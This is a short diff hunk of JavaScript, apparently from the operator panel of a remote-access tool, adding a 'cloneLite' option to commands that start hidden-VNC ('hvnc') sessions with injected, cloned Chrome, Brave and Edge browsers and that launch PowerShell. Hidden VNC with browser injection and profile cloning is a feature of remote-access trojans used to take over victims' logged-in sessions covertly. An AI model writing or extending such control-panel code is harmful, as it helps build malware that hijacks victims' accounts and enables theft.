@@ -747,13 +747,16 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
           sendCmd("hvnc_start_process", { path: "conhost powershell.exe" });
         } else if (action === "start-chrome") {
           const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "chrome", clone });
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          sendCmd("hvnc_start_browser_injected", { browser: "chrome", clone, cloneLite });
         } else if (action === "start-brave") {
           const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "brave", clone });
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          sendCmd("hvnc_start_browser_injected", { browser: "brave", clone, cloneLite });
         } else if (action === "start-edge") {
           const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "edge", clone });
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          sendCmd("hvnc_start_browser_injected", { browser: "edge", clone, cloneLite });
         } else if (action === "start-custom") {
           const exePath = prompt("Enter exe path (required)");
           if (!exePath) {
